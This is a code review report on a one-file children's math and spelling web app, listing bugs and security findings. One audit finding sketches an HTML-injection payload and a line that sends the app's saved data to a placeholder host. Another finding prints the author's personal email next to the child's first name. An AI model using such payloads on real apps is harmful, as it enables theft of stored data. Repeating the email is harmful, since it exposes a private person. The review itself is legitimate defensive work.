# Independent code review — Naomi's Brain Quest

Reviewed revision: `f1053f3` ("Add files via upload"), the `main` tree before the voice-picker change on this branch. The app is a single static file, `index.html` (~4,100 lines), served on GitHub Pages and played in iPad Safari. There is no build step, no package manifest, and no separate test suite in the repository (comments still mention `js/*.js` and `tests/ink.test.js` from an earlier multi-file layout; those files were not uploaded).

This is a report only. The voice picker on this branch is a new feature; it does not try to fix the findings below.

## Severity summary

| Severity | Count | Topic |
| --- | --- | --- |
| Critical | 0 | — |
| High | 2 | Corrupt save can blank the app; backup JSON can inject HTML and exfiltrate the save |
| Medium | 6 | Weak restore checks, silent quota loss, iPad speech/audio quirks, public author email, custom-word garden bug, iOS backup download |
| Low | 6 | PIN is a child gate, CSP limits, home-screen polish, schema version, dead code, speech cancel quirk |

No critical issues. The page makes no network requests of its own, and the parent PIN is only a child gate (see below).

## Critical

None.

## High

### 1. A bad `red.custom` entry prevents the app from booting

`NMQRed.tileText()` runs on every home render, including the first paint in `boot()`. It calls `wordsFor` → `allWords`. `allWords` trusts each saved custom word:

- `c` must be an object (`c.w` throws if an entry is `null`).
- `fromMask` + `parseSpec` throws `bad spec` when the word contains `[` without a matching `]`.
- There is no `try/catch` around `boot()` or the home render.

Words typed in the parent screen cannot do this: `cleanWord` keeps only `a–z` and at most 14 letters. A restored backup, or any hand-edited `localStorage['naomiMathQuest.v1']`, can. The result is a blank page. The only recovery is clearing the site data in Safari, which also deletes progress. `load()` checks that `red.custom` is an array and then stops; it does not check the entries.

### 2. Backup restore is an HTML-injection path, and CSP does not contain it

Almost every screen is drawn with `innerHTML`. The helper `esc()` correctly encodes `& < > " '` for names, reward text, custom-word letters, and sentences. The parent "add a word" path also strips non-letters and removes `<>` from the optional sentence. Typing a school word is not an XSS bug.

Restore is different. The handler is:

```js
var d = JSON.parse(fr.result);
if (!d || !d.settings || !d.modules) throw 0;
if (confirm('Replace current progress with this backup?')) { S = d; save(); load(); show('parent'); }
```

Anything with those two keys replaces the save. Several fields from that object are concatenated into HTML without `esc()`:

- Reward requests: `q.id` is placed in `data-v="..."`, and `q.amount` is placed in the parent screen and the Treasure screen as raw text.
- The session log writes `s.mode`, `s.stars`, `s.coins`, and (when `method === 'write'`) `s.rereads` as raw text. `methodLabel` throws if `method` is not a known answer method, which crashes the parent screen instead of rendering.

A crafted backup can break out of an attribute, for example `"><img src=x onerror="...">`. `innerHTML` does not run `<script>` tags, but it does run event handlers. `script-src 'unsafe-inline'` allows that handler. `connect-src 'none'` blocks `fetch` and remote images, but it does not block `location = 'https://example/?d=' + localStorage...`. A payload can navigate away carrying the whole save, including the parent PIN and the learning history, after the parent taps the confirm dialog.

Impact needs a file the parent chooses to restore. It is not a silent remote exploit. It is still a real injection into the page that holds the child's progress.

## Medium

### 3. Restore and migration checks are shallow

`load()` fills missing top-level keys and missing `settings` keys, and it replaces a `red.*` field whose type does not match the default. That is enough for an older math-only save to gain an empty Red Words blob. It does not:

- reject a backup that is not this app's data beyond the two-key check
- coerce `settings.pin`, `settings.rewards`, `sessions`, `facts`, `eggs`, or `red.custom`
- cap array length or string length
- re-run `cleanWord` on restored words
- bump or branch on the `v` field (`v` stays `1` and is never read)

A backup with `settings.pin` set to a non-4-digit value locks the parent screen until site data is cleared (`pinPress` compares the four typed digits to `String(pin)`). `settings` that is an array passes `typeof === 'object'` and is kept. `egg.type` or `minRarity` outside the catalog throws when an egg is opened (`EGG_INFO[type].name`).

### 4. Saves can fail silently, and session history grows without a cap

`save()` swallows `localStorage` exceptions (quota or private mode). Math `sessions`, Red Words `sessions`, and `learned` are append-only; the parent screen only *displays* the last 40 math sessions. After a long time on one iPad the quota can fill. From then on, new stars, coins, and words look saved and vanish on the next reload, with no message. A huge restore file is also parsed on the main thread with no size limit, which can freeze Safari.

### 5. iPad Safari speech and sound are easy to leave silent

Speech exists only on the Red Words path (`TTS` in the Red Words screen script). Math does not speak. The reviewed implementation:

- Calls `getVoices()` once at startup and listens for `voiceschanged`. On iOS that list is often empty at first, and `voiceschanged` is not reliable. The code does not poll.
- Keeps the first non-empty choice in `TTS.cache` until `voiceschanged`.
- Keeps only voices with `localService === true` and an `en*` language. On some Safari versions `localService` is missing or false for on-device voices, including Enhanced ones. The filter then matches nothing, `TTS.on()` is false, and every Speak button disappears. The parent message tells the adult to download Samantha, which is the wrong fix when voices are present but unmarked.
- Prefers Samantha, then Ava, Allison, Nicky, Susan, and only then a name starting with `Zoe`. "Zoe (Enhanced)" matches the `Zoe` prefix; "Zoey" does not. Samantha is on every current iPad, so Zoe is never chosen.
- Speaks the next practice word from the countdown timer (`setTimeout` after Play). iOS only allows `speechSynthesis.speak()` in the same turn as a user gesture, so the automatic line is commonly dropped. Spell It and Word Hunt then fall back to showing the word (`peek` / flash), so the game does not get stuck, but "listen, then spell" does not actually play. The Hear button is a real tap and can still speak.
- Creates and resumes `AudioContext` from the same countdown timers. The first ticks can be silent until a direct tap (a number key, a bubble) calls `resume()` inside the gesture. Later taps are fine. `visibilitychange` saves but does not resume a stuck speech queue.

`esc()` is used for the voice name in the parent note, so a unusual voice name is not an HTML injection.

### 6. Public git history identifies an adult email next to the child's first name

The source contains the first name Naomi (title, default profile, the old test sentence "Hello Naomi") and the ordinary word "school" in sentences and in the "school list" / "add a school word" labels. It does not contain a last name, a school name, a street address, a phone number, or an email.

Git metadata does. All three commits are authored by `TheLearningQuest <dr.danyoho@gmail.com>` (`cf76921`, `7da6ed0`, `f1053f3`). That address is not in `index.html`; it is in the public history of the GitHub Pages repo. Rewriting history would not by itself remove it from GitHub forks or caches. This review does not change git history.

### 7. New custom words stay locked in the word garden

The garden computes `locked = st === 'new' && !(w === nx && left)`. `nx` comes from one `wordsFor()` call and the garden from another. Built-in words are the same objects every time, so the comparison works and only the next new built-in word is tappable. Custom words are rebuilt on every call, so `w === nx` is never true. Every new school word is rendered `disabled`. The "Learn a new word" button still works, because it does not use that comparison. Comparing `w.id` would match.

### 8. "Backup file" is unreliable in iOS Safari

Export builds a `Blob`, points an `<a download>` at it, and clicks the link. iOS Safari often ignores `download` on blob URLs and navigates to the JSON (or does nothing). Navigating away unloads the app; progress already in `localStorage` remains, but the parent may not get a Files-app copy. Restore via `<input type="file">` is the more dependable half.

## Low

### 9. The parent PIN is a child gate, stored in the clear

Default `settings.pin` is `'1234'`. It is compared in the page, stored in the same `localStorage` object as progress, and included in every backup. There is no lockout delay. Reset-all keeps the current PIN. It is not used to encrypt anything, gate a server, or protect the backup file. `window.NMQApp.state()` also returns the live object, PIN included, to anyone with the Web Inspector. That matches the intended "grown-ups only" keypad. It should not be reused as a security secret. Because backups contain it, a shared backup file reveals it.

### 10. CSP is strict about the network and loose about inline script

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'
```

What holds: the only `http://` strings are the two SVG `xmlns="http://www.w3.org/2000/svg"` identifiers (browsers do not fetch that namespace). There is no `https://` URL, no `@font-face`, no `<link>`, no `<script src>`, no analytics, no CDN, no `fetch`, WebSocket, beacon, or worker. `object-src`, `frame-src`, `worker-src`, and `font-src` fall back to `default-src 'none'`. The font stack names `"Nunito"` and `"Varela Round"` but never loads them; missing families fall through to `ui-rounded` / system-ui. CSP would block a font download if a browser tried one. Inline SVG avatars and `AudioContext` tones do not need network or extra CSP sources. `blob:` on `img-src` is unused by the avatar (inline SVG); the backup link is a navigation, which CSP does not treat as an image.

What does not hold: `script-src 'unsafe-inline'` is required by this one-file design, and it means the CSP does not stop the restore injection in finding 2. There is no nonce or hash.

The page's own resources do not violate this policy.

### 11. Home-screen and viewport behavior is mostly right

`viewport-fit=cover`, `100dvh`, `env(safe-area-inset-*)`, `touch-action: manipulation`, `apple-mobile-web-app-capable`, and a translucent status bar are set. Pointer events drive the number pad, bubbles, both canvases, and the PIN pad, with `{ passive: false }` touch listeners so drawing does not scroll the page. `getCoalescedEvents` is used when present. There is no web app manifest (a linked manifest would be blocked by `default-src` anyway). There is no `apple-touch-icon`, so Add to Home Screen uses a screenshot. `user-scalable=no` and `maximum-scale=1` fight pinch-zoom, which is normal for this game and a mild accessibility cost. `black-translucent` plus the safe-area padding is the right pair; content should not sit under the status bar.

### 12. Schema version is decorative

`v: 1` is written and never consulted. Migration is "copy any missing default key". That worked for adding `red` and the answer-method fields. A future change that reuses an existing key with a new shape will not migrate. The voice picker adds `settings.voiceURI` and `settings.voiceName` through this same missing-key path, so old saves keep working.

### 13. Small logic and dead-state notes

- `pinMode` is assigned and never read.
- `blankSentence` builds `new RegExp('\\b' + word + '\\b')`. Typed words are letters only, so this is safe on the parent form. A restored word with a regex metacharacter can throw while rendering a sentence and take down that screen. Same family as finding 1, narrower because it does not run on the home screen unless that word is opened.
- `topMissed` divides by `seen`. A fact with `wrong > 0` has been incremented, so `seen` is at least 1 on data this app wrote. A restored fact with `wrong > 0` and `seen === 0` yields `Infinity` and sorts oddly; it does not throw.
- Spaced review itself matches the parent copy: boxes move on a due day by 1 / 3 / 7 / 21 days (`INTERVALS`), a miss drops two boxes (not below 1), and a peek does not promote. The daily new-word cap is enforced on the Learn button.

## Did the polish pass break a feature?

The history is three commits: the README, then a math-only upload, then the current file (+2,736 / −202 lines). The second upload is the Red Words section, Number Pad / Bubble Pop / Write It, the kawaii avatar, mastery grids, and the stricter parent screen. There is no separate "polish" commit to diff against. Reading the current control flow:

- **Number Pad, Bubble Pop, Write It** are still wired. Streak records stay on the old `op|diff|streak` key; speed records for Bubble and Write It use a method suffix so old Number Pad bests are preserved. Auto-submit, fix-after-miss, and the handwriting reader (`NMQInk.read`) are called from the play loop. I did not find a broken submit path in review.
- **Avatar and eggs** still render from the catalog, hatch on the third tap, and pay duplicate coins. Equipped ids that are not in the catalog are ignored, so a weird save does not inject SVG.
- **Red Words steps** (see/hear, tap letters twice, trace, write, sentence) and the three games are present and reached from the hub. Spaced review behaves as the parent text says (finding 13). The garden lock bug (finding 7) is real for school words and is easy to mistake for a broken My Words list.
- **Parent screen and PIN gate** still block the dashboard behind the keypad and still do not protect anything else. Backup/restore, coin adjust, and reward requests are intact, with the validation gaps above.
- **Speech**, added in that second upload, is the piece most likely to look "broken" on the iPad the app is played on (finding 5): empty voice list, `localService` filter, and speak-after-countdown.

I could not click through an iPad from this review. The conclusions above are from reading the control flow, not from a device pass.

## What is in good shape

- No third-party script, font request, or analytics. Progress stays in `localStorage` under `naomiMathQuest.v1`.
- Typed custom words and the player name go through `esc()` or `cleanWord`.
- Pointer handling, safe areas, and the reduced-motion media query are thought through for an iPad.
- Red Words degrades to on-screen text when speech returns false, instead of waiting forever for a voice.
- The PIN is not pretending to be encryption.
